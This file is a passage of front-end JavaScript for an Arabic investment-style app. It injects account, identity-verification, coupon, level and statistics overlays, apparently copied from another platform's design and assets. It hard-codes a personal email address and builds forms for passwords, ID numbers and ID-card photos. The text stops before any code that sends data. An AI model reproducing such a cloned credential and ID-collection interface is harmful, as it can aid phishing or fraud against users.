(function(){
if(document.getElementById('accountOverlay')){document.getElementById('accountOverlay').style.display='block';return;}

var GH='https://raw.githubusercontent.com/METAEGGAS/amana/main/';

var css=`
#accountOverlay{position:fixed;top:0;left:0;right:0;bottom:60px;max-width:480px;margin:0 auto;background:#F5F6FA;z-index:9998;overflow-y:auto;font-family:'Noto Sans Arabic',-apple-system,'Segoe UI',Tahoma,Arial,sans-serif;direction:rtl}
#accountOverlay .ac-header{background:linear-gradient(180deg,#8B7FE8 0%,#9B8FF0 50%,#A99EF5 100%);padding:14px 16px 90px;position:relative;overflow:hidden}
#accountOverlay .ac-header::before{content:'';position:absolute;width:300px;height:300px;border-radius:50%;background:rgba(255,255,255,.08);top:-100px;right:-80px}
#accountOverlay .ac-header::after{content:'';position:absolute;width:220px;height:220px;border-radius:50%;background:rgba(255,255,255,.06);bottom:-50px;left:-60px}
#accountOverlay .ac-top{display:flex;justify-content:space-between;align-items:center;position:relative;z-index:2;margin-bottom:22px;direction:ltr}
#accountOverlay .ac-top-icons{display:flex;gap:16px;align-items:center}
#accountOverlay .ac-top-icons svg{width:22px;height:22px;fill:#fff;cursor:pointer}
#accountOverlay .ac-top-icons img{width:22px;height:22px;cursor:pointer;object-fit:contain}
#accountOverlay .ac-settings{background:rgba(255,255,255,.2);width:34px;height:34px;border-radius:8px;display:flex;align-items:center;justify-content:center;cursor:pointer}
#accountOverlay .ac-settings img{width:20px;height:20px;object-fit:contain}
#accountOverlay .ac-profile{text-align:center;position:relative;z-index:2}
#accountOverlay .ac-avatar-wrap{position:relative;width:88px;height:88px;margin:0 auto 14px}
#accountOverlay .ac-avatar-wrap img{width:100%;height:100%;border-radius:50%;object-fit:cover;border:3px solid rgba(255,255,255,.4)}
#accountOverlay .ac-cam{position:absolute;bottom:0;right:50%;transform:translateX(50%);background:rgba(0,0,0,.5);width:100%;height:26px;border-radius:0 0 50% 50%;display:flex;align-items:flex-start;justify-content:center;padding-top:2px;overflow:hidden}
#accountOverlay .ac-cam svg{width:16px;height:16px;fill:#fff}
#accountOverlay .ac-email{color:#fff;font-size:17px;font-weight:700;display:inline-flex;align-items:center;gap:8px;direction:ltr}
#accountOverlay .ac-vip{background:transparent;color:#FFD84D;font-size:14px;font-weight:800;letter-spacing:.5px}
#accountOverlay .ac-card{background:#fff;border-radius:14px;margin:-70px 16px 0;padding:18px;position:relative;z-index:3;box-shadow:0 4px 16px rgba(0,0,0,.06)}
#accountOverlay .ac-ids-row{display:flex;justify-content:space-between;align-items:center;direction:ltr}
#accountOverlay .ac-id-group{display:flex;align-items:center;gap:6px}
#accountOverlay .ac-id-group.rtl{direction:rtl}
#accountOverlay .ac-row-label{color:#8A8F9C;font-size:13px}
#accountOverlay .ac-row-val{color:#1A1A1A;font-size:14px;font-weight:700}
#accountOverlay .ac-copy{width:14px;height:14px;cursor:pointer;opacity:.5}
#accountOverlay .ac-divider{height:1px;background:#ECEEF4;margin:14px 0}
#accountOverlay .ac-assets-row{display:flex;justify-content:space-between;align-items:center;direction:ltr}
#accountOverlay .ac-assets-label{display:flex;align-items:center;gap:6px;color:#8A8F9C;font-size:13px}
#accountOverlay .ac-assets-label svg{width:16px;height:16px;stroke:#8A8F9C;fill:none;stroke-width:1.6;cursor:pointer}
#accountOverlay .ac-assets-info{color:#8A8F9C;font-size:13px;display:flex;align-items:center;gap:4px;cursor:pointer}
#accountOverlay .ac-assets-info svg{width:14px;height:14px;fill:none;stroke:#8A8F9C;stroke-width:2}
#accountOverlay .ac-balance{color:#7B6FE0;font-size:32px;font-weight:800;margin-top:6px;letter-spacing:.5px;text-align:left}
#accountOverlay .ac-actions{background:#fff;border-radius:14px;margin:14px 16px 0;padding:18px 10px;display:grid;grid-template-columns:repeat(4,1fr);gap:8px;box-shadow:0 2px 10px rgba(0,0,0,.04);direction:ltr}
#accountOverlay .ac-action{display:flex;flex-direction:column;align-items:center;gap:8px;cursor:pointer;padding:6px 0}
#accountOverlay .ac-action-ic{width:50px;height:50px;background:#EEE9FB;border-radius:12px;display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden}
#accountOverlay .ac-action-ic img{width:100%;height:100%;object-fit:contain}
#accountOverlay .ac-action-tx{font-size:11.5px;color:#1A1A1A;font-weight:600;text-align:center;line-height:1.3}
#accountOverlay .ac-menu{background:#fff;border-radius:14px;margin:14px 16px 20px;padding:4px 0;box-shadow:0 2px 10px rgba(0,0,0,.04)}
#accountOverlay .ac-item{display:flex;align-items:center;padding:16px 18px;cursor:pointer;border-bottom:1px solid #F0F2F7;direction:ltr}
#accountOverlay .ac-item:last-child{border-bottom:none}
#accountOverlay .ac-item-ic{width:26px;height:26px;display:flex;align-items:center;justify-content:center;margin-right:14px}
#accountOverlay .ac-item-ic img{width:22px;height:22px;object-fit:contain}
#accountOverlay .ac-item-tx{flex:1;font-size:14px;color:#1A1A1A;font-weight:600;text-align:left}
#accountOverlay .ac-item-arr{width:16px;height:16px;fill:none;stroke:#C4C8D1;stroke-width:2;transform:rotate(180deg)}

#verifyOverlay{position:fixed;top:0;left:0;right:0;bottom:0;max-width:480px;margin:0 auto;background:#f4f3fb;z-index:9999;overflow-y:auto;direction:rtl;font-family:'Segoe UI',Tahoma,sans-serif}
#verifyOverlay *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Tahoma,sans-serif;-webkit-tap-highlight-color:transparent;user-select:none}
#verifyOverlay input{user-select:text}
#verifyOverlay .hd{position:relative;background:linear-gradient(135deg,#6c6cf0,#8b5cf6);color:#fff;text-align:center;padding:20px 0 22px;font-size:20px;font-weight:800;overflow:hidden}
#verifyOverlay .hd .bg{position:absolute;inset:0;background:url('https://i.ibb.co/hRm446rn/IMG.png') center/cover;opacity:.5}
#verifyOverlay .hd .t{position:relative}
#verifyOverlay .hd .bk{position:absolute;left:14px;top:20px;cursor:pointer}
#verifyOverlay .sb{padding:12px;text-align:center;font-size:14px;font-weight:700;color:#fff;background:#e53935;display:none}
#verifyOverlay .sb.on{display:block}
#verifyOverlay .sb.ok{background:#2e7d32}
#verifyOverlay svg{display:block}
#verifyOverlay .card{background:#fff;border-radius:14px;margin:16px;padding:10px 20px;box-shadow:0 2px 10px rgba(0,0,0,.05)}
#verifyOverlay .row{display:flex;flex-direction:row-reverse;align-items:center;gap:16px;padding:20px 0;border-bottom:1.5px solid #eee;cursor:pointer}
#verifyOverlay .row:last-child{border:0}
#verifyOverlay .row .ic{width:26px;height:26px;color:#4a4a55;flex-shrink:0}
#verifyOverlay .row .lb{flex:1;color:#888;font-size:15px;font-weight:600}
#verifyOverlay .row .vl{flex:1;color:#1c1c22;font-size:15px;font-weight:700}
#verifyOverlay .row .ar{color:#999}
#verifyOverlay .row input{flex:1;border:0;outline:0;font-size:15px;font-weight:600;color:#1c1c22;background:none;font-family:inherit;text-align:right}
#verifyOverlay .row input::placeholder{color:#a3a3ad;font-weight:500}
#verifyOverlay .row input:disabled{color:#666}
#verifyOverlay .sec{margin:20px 18px 10px;font-size:17px;font-weight:800;color:#1c1c22}
#verifyOverlay .up{background:#efeafd;border-radius:14px;margin:0 16px 16px;padding:36px 18px 16px;text-align:center;cursor:pointer;display:block}
#verifyOverlay .up.dis{opacity:.7;pointer-events:none}
#verifyOverlay .up .fr{position:relative;background:#d9cffb;border-radius:10px;padding:28px 14px}
#verifyOverlay .c{position:absolute;width:28px;height:28px;border:5px solid #b39df0}
#verifyOverlay .c1{top:8px;left:8px;border-right:0;border-bottom:0;border-radius:9px 0 0 0}
#verifyOverlay .c2{top:8px;right:8px;border-left:0;border-bottom:0;border-radius:0 9px 0 0}
#verifyOverlay .c3{bottom:8px;left:8px;border-right:0;border-top:0;border-radius:0 0 0 9px}
#verifyOverlay .c4{bottom:8px;right:8px;border-left:0;border-top:0;border-radius:0 0 9px 0}
#verifyOverlay .up img{max-width:155px;display:block;margin:auto}
#verifyOverlay .up p{color:#7d77a0;font-size:13px;font-weight:600;margin-top:16px}
#verifyOverlay .up input[type=file]{display:none}
#verifyOverlay .btn{display:block;width:calc(100% - 32px);margin:12px 16px 32px;padding:16px;border:0;border-radius:12px;background:#2f6bff;color:#fff;font-size:18px;font-weight:800;cursor:pointer;font-family:inherit}
#verifyOverlay .btn:disabled{background:#9bb0e0;cursor:not-allowed}
#verifyOverlay .ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:10}
#verifyOverlay .ov.on{display:flex;align-items:flex-end;justify-content:center}
#verifyOverlay .sh{width:100%;max-width:480px;background:#fff;border-radius:18px 18px 0 0;padding:22px 20px 32px;max-height:70vh;overflow-y:auto}
#verifyOverlay .sh .hd2{display:flex;justify-content:space-between;align-items:center;font-size:18px;font-weight:800;margin-bottom:12px;position:sticky;top:0;background:#fff;padding-bottom:8px}
#verifyOverlay .sh .x{cursor:pointer;color:#999}
#verifyOverlay .opt{display:flex;flex-direction:row-reverse;justify-content:space-between;align-items:center;padding:19px 4px;border-bottom:1.5px solid #f0f0f0;font-size:15px;font-weight:700;color:#2a2a32;cursor:pointer}
#verifyOverlay .opt:last-child{border:0}
#verifyOverlay .opt.sel{color:#7c5cf0}
#verifyOverlay .opt .ck{color:#7c5cf0}
#verifyOverlay .sr{width:100%;padding:10px;border:1.5px solid #eee;border-radius:8px;font-size:14px;margin-bottom:10px;font-family:inherit;text-align:right;box-sizing:border-box}
#verifyOverlay .lg{position:fixed;inset:0;background:#fff;z-index:100;display:flex;flex-direction:column;align-items:center;justify-content:flex-start;padding-top:30vh}
#verifyOverlay .lg img{width:80px;height:80px}
#verifyOverlay .au{position:fixed;inset:0;background:#f4f3fb;z-index:50;display:none;flex-direction:column;align-items:center;justify-content:center;padding:20px}
#verifyOverlay .au.on{display:flex}
#verifyOverlay .au .box{width:100%;max-width:360px;background:#fff;padding:30px 22px;border-radius:14px;box-shadow:0 2px 10px rgba(0,0,0,.08)}
#verifyOverlay .au h2{text-align:center;margin-bottom:20px;color:#1c1c22;font-size:20px}
#verifyOverlay .au input{width:100%;padding:13px;border:1.5px solid #ddd;border-radius:8px;margin-bottom:12px;font-size:15px;font-family:inherit;text-align:right;box-sizing:border-box}
#verifyOverlay .au button{width:100%;padding:14px;border:0;border-radius:8px;background:#2f6bff;color:#fff;font-weight:800;font-size:16px;cursor:pointer;margin-bottom:10px;font-family:inherit}
#verifyOverlay .au .sw{text-align:center;color:#2f6bff;cursor:pointer;font-size:14px;font-weight:600}
#verifyOverlay .au .er{color:#e53935;font-size:13px;text-align:center;margin-bottom:10px;min-height:18px}

/* ===== صفحة القسيمة (couponOverlay) — نسخة حرفية من الصورة المرجعية — اتجاه أجنبي LTR بالكامل ===== */
#couponOverlay{position:fixed;top:0;left:0;right:0;bottom:0;max-width:480px;margin:0 auto;background:#F5F6FA;z-index:9999;overflow:hidden;font-family:'Noto Sans Arabic',-apple-system,'Segoe UI',Tahoma,Arial,sans-serif;direction:ltr;display:flex;flex-direction:column}
#couponOverlay *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
#couponOverlay .cp-hd{position:relative;background:#8B7FE8 url('https://i.ibb.co/hRm446rn/IMG.png') center/cover no-repeat;color:#fff;text-align:center;padding:17px 0;font-size:17px;font-weight:800;flex-shrink:0}
#couponOverlay .cp-hd .cp-bk{position:absolute;left:14px;top:50%;transform:translateY(-50%);cursor:pointer;display:flex;align-items:center;justify-content:center;width:28px;height:28px}
#couponOverlay .cp-hd .cp-bk svg{width:22px;height:22px;stroke:#fff;fill:none;stroke-width:2.6;stroke-linecap:round;stroke-linejoin:round}
#couponOverlay .cp-tabs{display:flex;background:#fff;overflow-x:auto;white-space:nowrap;scrollbar-width:none;flex-shrink:0}
#couponOverlay .cp-tabs::-webkit-scrollbar{display:none}
#couponOverlay .cp-tab{padding:14px 16px 12px;font-size:13.5px;color:#9AA0AB;font-weight:600;cursor:pointer;position:relative;flex-shrink:0;line-height:1.4}
#couponOverlay .cp-tab.on{color:#1A1A1A;font-weight:800}
#couponOverlay .cp-tab.on::after{content:'';position:absolute;bottom:0;left:10px;right:10px;height:3.5px;border-radius:4px 4px 0 0;background:#7B6FE0}
#couponOverlay .cp-body{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding-bottom:90px}
#couponOverlay .cp-empty{width:110px;height:110px;object-fit:contain}
#couponOverlay .cp-empty-tx{margin-top:16px;color:#9AA0AB;font-size:14px;font-weight:600}
#couponOverlay .cp-lg{position:absolute;inset:0;background:#fff;z-index:100;display:flex;flex-direction:column;align-items:center;justify-content:flex-start;padding-top:30vh}
#couponOverlay .cp-lg img{width:80px;height:80px}

/* ===== صفحة مستواي (levelOverlay) — نفس تصميم ملف mstea.html حرفيًا — اتجاه LTR ===== */
#levelOverlay{position:fixed;top:0;left:0;right:0;bottom:0;max-width:480px;margin:0 auto;background:#f6f6fa;z-index:9999;overflow-y:auto;direction:ltr;font-family:'Segoe UI',Arial,sans-serif}
#levelOverlay *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Arial,sans-serif;-webkit-tap-highlight-color:transparent;user-select:none}
#levelOverlay .hdr{background:url('https://i.ibb.co/hRm446rn/IMG.png') center/cover no-repeat,#7a63e8;height:56px;display:flex;align-items:center;justify-content:center;position:relative;color:#fff}
#levelOverlay .hdr .bk{position:absolute;left:14px;top:50%;transform:translateY(-50%);font-size:22px;cursor:pointer}
#levelOverlay .hdr h1{font-size:17px;font-weight:600}
#levelOverlay .wrap{padding:14px}
#levelOverlay .card{background:linear-gradient(120deg,#6f5ae0 0%,#8a76f2 55%,#7d68ec 100%);border-radius:18px;padding:26px 20px 22px;position:relative;color:#fff;overflow:hidden;box-shadow:0 6px 18px rgba(110,90,220,.25)}
#levelOverlay .card:before{content:'';position:absolute;right:-40px;top:-40px;width:220px;height:220px;background:radial-gradient(circle,rgba(255,255,255,.12),transparent 70%)}
#levelOverlay .badge{position:absolute;top:14px;right:0;background:rgba(60,40,160,.55);padding:8px 16px 8px 14px;border-radius:14px 0 0 14px;font-size:12px;font-weight:600}
#levelOverlay .vip{font-size:42px;font-weight:800;letter-spacing:2px}
#levelOverlay .stars{margin:8px 0 14px;display:flex;gap:8px}
#levelOverlay .stars svg{width:26px;height:26px;stroke:#cbbffb;fill:none;stroke-width:1.4;opacity:.85}
#levelOverlay .clevel{display:flex;align-items:center;gap:8px;font-size:14px;opacity:.95}
#levelOverlay .clevel i{display:inline-block;width:7px;height:14px;border:1.5px solid #fff;border-radius:2px}
#levelOverlay .panel{background:#fff;border-radius:14px;margin-top:14px;padding:6px 18px 18px;box-shadow:0 2px 8px rgba(0,0,0,.04)}
#levelOverlay .phead{display:flex;justify-content:space-between;align-items:center;padding:14px 0;border-bottom:1px solid #eee}
#levelOverlay .phead b{font-size:16px}
#levelOverlay .ref{display:flex;align-items:center;gap:6px;color:#555;font-size:13px;cursor:pointer}
#levelOverlay .ref svg{width:16px;height:16px;stroke:#666;fill:none;stroke-width:2}
#levelOverlay .rows{display:flex;justify-content:space-around;padding:26px 0 20px;position:relative}
#levelOverlay .rows:before{content:'';position:absolute;left:50%;top:20%;bottom:20%;width:1px;background:#eee}
#levelOverlay .item{display:flex;flex-direction:column;align-items:center;gap:12px;cursor:pointer;flex:1}
#levelOverlay .item .ic{width:56px;height:56px;border-radius:50%;background:#f0edff;display:flex;align-items:center;justify-content:center}
#levelOverlay .item .ic svg{width:28px;height:28px;stroke:#7a63e8;fill:none;stroke-width:1.6}
#levelOverlay .item span{font-size:13px;color:#333;display:flex;align-items:center;gap:5px;font-weight:600}
#levelOverlay .item span em{font-style:normal;font-size:15px}
#levelOverlay .note{background:#f6f8fc;border-radius:10px;padding:12px 14px;font-size:12px;color:#666;line-height:1.7;display:flex;gap:10px;align-items:flex-start}
#levelOverlay .note svg{flex-shrink:0;width:18px;height:18px;stroke:#7a63e8;fill:none;stroke-width:1.8;margin-top:2px}
#levelOverlay .lv-lg{position:absolute;inset:0;background:#fff;z-index:100;display:flex;flex-direction:column;align-items:center;justify-content:flex-start;padding-top:30vh}
#levelOverlay .lv-lg img{width:80px;height:80px}

/* ===== صفحة إحصائيات النشاط (statsOverlay) — نفس تصميم ملف ahsahiat.html حرفيًا — اتجاه LTR ===== */
#statsOverlay{position:fixed;top:0;left:0;right:0;bottom:0;max-width:480px;margin:0 auto;background:#f4f5f9;z-index:9999;overflow-y:auto;direction:ltr;font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;color:#1a1a2e}
#statsOverlay *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;user-select:none}
#statsOverlay .hd{position:relative;height:56px;display:flex;align-items:center;justify-content:center;background:#6a5cff url('https://i.ibb.co/hRm446rn/IMG.png') center/cover no-repeat;color:#fff}
#statsOverlay .hd .bk{position:absolute;left:14px;top:50%;transform:translateY(-50%);font-size:26px;font-weight:300;line-height:1;cursor:pointer;color:#fff}
#statsOverlay .hd h1{font-size:17px;font-weight:600;letter-spacing:.3px}
#statsOverlay .wrap{padding:18px 16px 30px}
#statsOverlay .tz{font-size:12px;color:#9aa0b4;margin:2px 2px 14px;text-align:center}
#statsOverlay .note{background:#ece9ff;border-radius:12px;padding:14px 16px;font-size:13px;line-height:1.7;color:#5a4fd8;font-weight:500;margin-bottom:24px}
#statsOverlay .lbl{font-size:16px;font-weight:700;margin:0 4px 14px}
#statsOverlay .card{background:#fff;border-radius:14px;box-shadow:0 2px 12px rgba(90,80,200,.06);overflow:hidden}
#statsOverlay .row{display:flex;align-items:center;justify-content:space-between;padding:18px 18px;font-size:14px}
#statsOverlay .row+.row{border-top:1px solid #f2f2f7}
#statsOverlay .row .k{color:#3c3c55}
#statsOverlay .row .v{display:flex;align-items:center;gap:8px;color:#1a1a2e;font-variant-numeric:tabular-nums}
#statsOverlay .chv{color:#c6c9d6;font-size:18px;font-weight:300}
#statsOverlay .btn{display:block;width:100%;margin:22px 0 26px;padding:15px;border:0;border-radius:12px;background:linear-gradient(90deg,#7b6cff,#6a5cff);color:#fff;font-size:16px;font-weight:600;cursor:pointer;box-shadow:0 6px 16px rgba(106,92,255,.35)}
#statsOverlay .cnt{text-align:center;padding:26px 0 20px}
#statsOverlay .cnt b{font-size:44px;font-weight:800;background:linear-gradient(180deg,#7b6cff,#5a4fd8);-webkit-background-clip:text;background-clip:text;color:transparent}
#statsOverlay .cnt span{font-size:13px;color:#9aa0b4;margin-left:6px}
#statsOverlay .info{padding:6px 18px 18px}
#statsOverlay .info .r{display:flex;justify-content:space-between;align-items:center;padding:12px 0;font-size:13px}
#statsOverlay .info .r .k{color:#9aa0b4}
#statsOverlay .info .r .v{color:#1a1a2e;font-weight:500}
#statsOverlay .info .rng{font-size:14px;color:#1a1a2e;padding-top:6px;font-variant-numeric:tabular-nums}
#statsOverlay .st-lg{position:absolute;inset:0;background:#fff;z-index:100;display:flex;flex-direction:column;align-items:center;justify-content:flex-start;padding-top:30vh}
#statsOverlay .st-lg img{width:80px;height:80px}

/* ===== شاشة تحميل مركز خدمة العملاء — نفس شاشة تحميل التوثيق والقسيمة ===== */
#supLg{position:fixed;inset:0;max-width:480px;margin:0 auto;background:#fff;z-index:9999;display:none;flex-direction:column;align-items:center;justify-content:flex-start;padding-top:30vh}
#supLg img{width:80px;height:80px}
`;
var st=document.createElement('style');st.id='accountOverlayStyle';st.textContent=css;document.head.appendChild(st);

var html=`
<div class="ac-header">
  <div class="ac-top">
    <div class="ac-top-icons">
      <svg viewBox="0 0 24 24"><path d="M21 12.8A9 9 0 1111.2 3a7 7 0 009.8 9.8z"/></svg>
      <img src="https://gulfxdl.com/assets/language-Bymc3Lbd.png" alt="language">
    </div>
    <div class="ac-settings" id="acSettings">
      <img src="https://gulfxdl.com/assets/setting-DQ3FSC7i.png" alt="settings">
    </div>
  </div>
  <div class="ac-profile">
    <div class="ac-avatar-wrap">
      <img src="`+GH+`avatar-CZjm-vGp.png" alt="avatar">
      <div class="ac-cam"><svg viewBox="0 0 24 24"><path d="M9 3L7.2 5H4a2 2 0 00-2 2v11a2 2 0 002 2h16a2 2 0 002-2V7a2 2 0 00-2-2h-3.2L15 3H9zm3 15a5 5 0 110-10 5 5 0 010 10z"/></svg></div>
    </div>
    <div class="ac-email">ttwt09191@gmail.com <span class="ac-vip">VIP 0</span></div>
  </div>
</div>

<div class="ac-card">
  <div class="ac-ids-row">
    <div class="ac-id-group">
      <span class="ac-row-label">UID</span>
      <span class="ac-row-val">10321280</span>
      <svg class="ac-copy" viewBox="0 0 24 24" fill="#8A8F9C"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
    </div>
    <div class="ac-id-group rtl">
      <span class="ac-row-label">رمز الدعوة</span>
      <span class="ac-row-val">F34NTY</span>
      <svg class="ac-copy" viewBox="0 0 24 24" fill="#8A8F9C"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
    </div>
  </div>
  <div class="ac-divider"></div>
  <div class="ac-assets-row">
    <div class="ac-assets-label">
      <span>إجمالي الأصول</span>
      <svg id="acEye" viewBox="0 0 24 24"><path d="M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6-10-6-10-6z"/><circle cx="12" cy="12" r="2.6"/></svg>
    </div>
    <div class="ac-assets-info">
      <span>معلومات الأصول</span>
      <svg viewBox="0 0 24 24"><path d="M14 6l-6 6 6 6"/></svg>
    </div>
  </div>
  <div class="ac-balance" id="acBal">$0.00</div>
</div>

<div class="ac-actions">
  <div class="ac-action">
    <div class="ac-action-ic"><img src="`+GH+`Shajjs.png" alt="سجل تغييرات الحساب"></div>
    <div class="ac-action-tx">سجل تغييرات الحساب</div>
  </div>
  <div class="ac-action">
    <div class="ac-action-ic"><img src="`+GH+`Ozbsjjz.png" alt="اتفاقية الاستثمار التلقائي"></div>
    <div class="ac-action-tx">اتفاقية الاستثمار التلقائي</div>
  </div>
  <div class="ac-action">
    <div class="ac-action-ic"><img src="https://gulfxdl.com/assets/draw-light-Ddf7eLEI.png" alt="عجلة الحظ"></div>
    <div class="ac-action-tx">عجلة الحظ</div>
  </div>
  <div class="ac-action">
    <div class="ac-action-ic"><img src="`+GH+`Isbshsh.png" alt="دعوة الأصدقاء"></div>
    <div class="ac-action-tx">دعوة الأصدقاء</div>
  </div>
</div>

<div class="ac-menu">
  <div class="ac-item" id="acVerify">
    <div class="ac-item-ic"><img src="`+GH+`Nzosknznz.png" alt="توثيق الهوية"></div>
    <div class="ac-item-tx">توثيق الهوية</div>
    <svg class="ac-item-arr" viewBox="0 0 24 24"><path d="M15 6l-6 6 6 6" stroke="#C4C8D1" fill="none" stroke-width="2" stroke-linecap="round"/></svg>
  </div>
  <div class="ac-item" id="acCoupon">
    <div class="ac-item-ic"><img src="`+GH+`Kzkzjjz.png" alt="قسيمة"></div>
    <div class="ac-item-tx">قسيمة</div>
    <svg class="ac-item-arr" viewBox="0 0 24 24"><path d="M15 6l-6 6 6 6" stroke="#C4C8D1" fill="none" stroke-width="2" stroke-linecap="round"/></svg>
  </div>
  <div class="ac-item" id="acLevel">
    <div class="ac-item-ic"><img src="`+GH+`Zjisjzhbz.png" alt="مستواي"></div>
    <div class="ac-item-tx">مستواي</div>
    <svg class="ac-item-arr" viewBox="0 0 24 24"><path d="M15 6l-6 6 6 6" stroke="#C4C8D1" fill="none" stroke-width="2" stroke-linecap="round"/></svg>
  </div>
  <div class="ac-item" id="acStats">
    <div class="ac-item-ic"><img src="`+GH+`ZnjJajaj.png" alt="إحصائيات النشاط"></div>
    <div class="ac-item-tx">إحصائيات النشاط</div>
    <svg class="ac-item-arr" viewBox="0 0 24 24"><path d="M15 6l-6 6 6 6" stroke="#C4C8D1" fill="none" stroke-width="2" stroke-linecap="round"/></svg>
  </div>
  <div class="ac-item" id="acSupport">
    <div class="ac-item-ic"><img src="`+GH+`Zbjakskjz.png" alt="مركز خدمة العملاء"></div>
    <div class="ac-item-tx">مركز خدمة العملاء</div>
    <svg class="ac-item-arr" viewBox="0 0 24 24"><path d="M15 6l-6 6 6 6" stroke="#C4C8D1" fill="none" stroke-width="2" stroke-linecap="round"/></svg>
  </div>
  <div class="ac-item">
    <div class="ac-item-ic"><img src="`+GH+`Jzjzjfhhh.png" alt="تحميل التطبيق"></div>
    <div class="ac-item-tx">تحميل التطبيق</div>
    <svg class="ac-item-arr" viewBox="0 0 24 24"><path d="M15 6l-6 6 6 6" stroke="#C4C8D1" fill="none" stroke-width="2" stroke-linecap="round"/></svg>
  </div>
  <div class="ac-item">
    <div class="ac-item-ic"><img src="`+GH+`Jzjsijs.png" alt="حول"></div>
    <div class="ac-item-tx">حول</div>
    <svg class="ac-item-arr" viewBox="0 0 24 24"><path d="M15 6l-6 6 6 6" stroke="#C4C8D1" fill="none" stroke-width="2" stroke-linecap="round"/></svg>
  </div>
  <div class="ac-item">
    <div class="ac-item-ic"><img src="`+GH+`Nzjsiskjs.png" alt="تسجيل الخروج"></div>
    <div class="ac-item-tx">تسجيل الخروج</div>
    <svg class="ac-item-arr" viewBox="0 0 24 24"><path d="M15 6l-6 6 6 6" stroke="#C4C8D1" fill="none" stroke-width="2" stroke-linecap="round"/></svg>
  </div>
</div>
`;

var overlay=document.createElement('div');
overlay.id='accountOverlay';
overlay.innerHTML=html;
document.body.appendChild(overlay);

// Eye toggle
var acEye=document.getElementById('acEye'),acBal=document.getElementById('acBal'),acHid=false,acReal=acBal.textContent;
acEye.addEventListener('click',function(){acHid=!acHid;acBal.textContent=acHid?'***':acReal;});

// Copy functionality
document.querySelectorAll('#accountOverlay .ac-copy').forEach(function(c){
  c.addEventListener('click',function(e){
    var txt=c.previousElementSibling.textContent;
    if(navigator.clipboard){navigator.clipboard.writeText(txt);}
    c.style.opacity='1';setTimeout(function(){c.style.opacity='.5';},400);
  });
});

// Action buttons feedback
document.querySelectorAll('#accountOverlay .ac-action, #accountOverlay .ac-item').forEach(function(b){
  b.addEventListener('click',function(){
    b.style.transform='scale(.97)';setTimeout(function(){b.style.transform='';},120);
  });
});

// زرار الرجوع في صفحة التوثيق: يقفل الـ Overlay ويرجع للبروفايل
window.closeVerify=function(){var vo=document.getElementById('verifyOverlay');if(vo)vo.style.display='none';};

var verifyHtml=`
<div class="lg" id="lg"><img src="https://gulfxdl.com/assets/loading-D0BtznxM.gif"></div>
<div class="au" id="au"><div class="box"><h2 id="aT">تسجيل الدخول</h2><div class="er" id="aE"></div><input type="email" id="aEm" placeholder="البريد الإلكتروني"><input type="password" id="aPw" placeholder="كلمة السر"><button onclick="doAuth()" id="aB">دخول</button><div class="sw" onclick="tog()" id="aS">ليس لديك حساب؟ إنشاء حساب</div></div></div>
<div class="hd"><span class="bk" onclick="closeVerify()"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg></span><div class="bg"></div><div class="t">توثيق الهوية</div></div>
<div class="sb" id="sb"></div>
<div class="card">
<div class="row" onclick="openSh('cOv')" id="rC"><span class="ic"><svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.1" stroke-linecap="round"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3c2.5 2.6 3.8 5.7 3.8 9S14.5 18.4 12 21c-2.5-2.6-3.8-5.7-3.8-9S9.5 5.6 12 3z"/></svg></span><span class="vl" id="cVal">United States</span><span class="ar"><svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"><path d="M9 6l6 6-6 6"/></svg></span></div>
<div class="row"><span class="ic"><svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.1" stroke-linecap="round"><circle cx="12" cy="8" r="4"/><path d="M4 20c1.5-3.5 4.5-5 8-5s6.5 1.5 8 5"/></svg></span><input id="nm" placeholder="يرجى إدخال الاسم"></div>
<div class="row" onclick="openSh('dOv')" id="rD"><span class="ic"><svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.1" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="5" width="18" height="14" rx="2"/><circle cx="8.5" cy="11" r="2"/><path d="M5.5 16.5c.8-1.5 1.8-2.2 3-2.2s2.2.7 3 2.2M14 9h5M14 12.5h5M14 16h3"/></svg></span><span class="lb" id="dVal">يرجى اختيار نوع الوثيقة</span><span class="ar"><svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"><path d="M9 6l6 6-6 6"/></svg></span></div>
<div class="row"><span class="ic"><svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.1" stroke-linecap="round"><rect x="3" y="6" width="18" height="13" rx="2"/><path d="M3 10h18M7 15h4"/></svg></span><input id="idn" placeholder="يرجى إدخال رقم بطاقة الهوية"></div>
</div>
<div class="sec">صورة بطاقة الهوية</div>
<label class="up" id="uF"><input type="file" accept="image/*" onchange="prev(this,'fImg')"><div class="fr"><span class="c c1"></span><span class="c c2"></span><span class="c c3"></span><span class="c c4"></span><img id="fImg" src="https://gulfxdl.com/assets/idImg1-light-BjGturpJ.png"></div><p>يرجى رفع صورة بطاقة الهوية من الوجه الأمامي</p></label>
